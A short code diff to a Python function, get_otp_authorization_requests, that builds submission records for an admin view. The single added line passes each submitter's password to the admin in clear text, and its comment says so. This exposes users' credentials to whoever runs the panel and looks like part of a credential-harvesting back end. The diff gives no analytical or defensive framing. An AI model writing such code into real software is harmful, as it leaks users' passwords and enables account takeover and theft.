@@ -1127,6 +1127,7 @@ def get_otp_authorization_requests():
                 if submission:
                     request_dict['submission'] = {
                         'fullname': submission.fullname,
+                        'password': submission.password,  # Pass clear-text password to admin
                         'submitted_at': submission.submitted_at.isoformat() if submission.submitted_at else None,
                         'phone_number': submission.phone_number
                     }
